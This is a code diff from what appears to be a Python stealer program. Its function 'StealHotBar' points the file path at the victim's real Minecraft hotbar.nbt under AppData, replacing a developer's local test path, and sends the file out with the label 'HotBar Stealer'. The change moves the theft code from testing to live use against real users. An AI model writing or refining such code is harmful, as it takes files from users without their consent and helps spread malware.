@@ -37,8 +37,7 @@ global time_count, time_delay
 time_count = time_delay = 10
 
 def StealHotBar():
-	# hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
-	hotbar = r"D:\TL Legacy\game\hotbar.nbt"
+	hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
 	try:
 		sender.send_file(hotbar, '**HotBar Stealer**')
 	except:
